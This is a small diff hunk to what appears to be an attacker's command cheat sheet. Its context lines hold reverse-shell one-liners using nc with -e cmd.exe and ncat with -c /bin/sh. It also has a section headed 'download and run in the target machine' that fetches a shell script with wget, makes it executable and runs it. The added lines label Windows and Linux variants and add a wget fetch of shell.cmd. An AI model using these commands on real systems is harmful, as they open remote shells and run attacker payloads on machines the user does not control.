@@ -16,6 +16,9 @@ nc 127.0.0.1 1609 -e cmd.exe
 ncat 127.0.0.1 1609 -c /bin/sh
 
 # download and run in the target machine
+# win
+wget http://127.0.0.1:8080/shell.cmd
+# linux
 wget http://127.0.0.1:8080/shell.sh
 chmod +x shell.sh
 ./shell.sh
